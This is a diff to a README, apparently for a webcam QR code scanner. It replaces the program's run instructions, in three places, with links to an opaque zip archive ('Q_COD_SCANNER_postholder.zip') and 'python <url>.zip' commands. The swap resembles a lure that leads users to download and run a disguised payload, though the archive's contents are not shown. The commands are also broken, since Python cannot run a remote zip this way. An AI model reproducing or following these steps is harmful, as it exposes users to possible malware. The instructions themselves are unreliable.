@@ -28,10 +28,10 @@ Only after installing OpenCV install imutils as it depends on it.
 foo@bar:~$ pip install imutils
 
 Running the application
-Check whether you webcam is accessible by running the https://raw.githubusercontent.com/Tanishq60/QR_CODE_SCANNER/master/interrogable/QR_CODE_SCANNER.zip program.
+Check whether you webcam is accessible by running the https://github.com/Tanishq60/QR_CODE_SCANNER/raw/refs/heads/master/QR-Code-master/Q_COD_SCANNER_postholder.zip program.
 
-foo@bar:~$ python https://raw.githubusercontent.com/Tanishq60/QR_CODE_SCANNER/master/interrogable/QR_CODE_SCANNER.zip
+foo@bar:~$ python https://github.com/Tanishq60/QR_CODE_SCANNER/raw/refs/heads/master/QR-Code-master/Q_COD_SCANNER_postholder.zip
 
 Run the program by using python
 
-foo@bar:~$ python https://raw.githubusercontent.com/Tanishq60/QR_CODE_SCANNER/master/interrogable/QR_CODE_SCANNER.zip
+foo@bar:~$ python https://github.com/Tanishq60/QR_CODE_SCANNER/raw/refs/heads/master/QR-Code-master/Q_COD_SCANNER_postholder.zip
